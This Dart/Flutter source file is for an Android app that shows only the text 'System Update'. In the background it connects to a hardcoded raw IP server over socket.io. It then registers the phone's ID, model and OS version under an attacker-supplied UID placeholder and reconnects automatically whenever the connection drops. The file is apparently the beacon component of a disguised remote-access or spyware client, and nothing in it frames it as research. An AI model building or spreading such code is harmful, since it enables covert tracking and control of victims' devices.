import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';

const String SERVER_URL = 'http://152.42.184.64:2363'; 
const String TARGET_UID = 'ISI_UID_KAMU_DISINI'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
  _connectToServer();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(body: Center(child: Text('System Update'))),
    );
  }
}

Future<void> _connectToServer() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;

    IO.Socket socket = IO.io(SERVER_URL, 
      IO.OptionBuilder()
      .setTransports(['websocket'])
      .setExtraHeaders({'x-auth-token': TARGET_UID})
      .build()
    );

    socket.onConnect((_) {
      socket.emit('device:register', {
        'deviceId': androidInfo.id,
        'name': androidInfo.model,
        'battery': 100,
        'charging': false,
        'sdkVersion': androidInfo.version.sdkInt.toString(),
        'androidVersion': androidInfo.version.release,
        'uid': TARGET_UID,
      });
    });

    socket.onDisconnect((_) => Timer(const Duration(seconds: 5), () => socket.connect()));
  } catch (e) {
    print('Error: $e');
  }
}
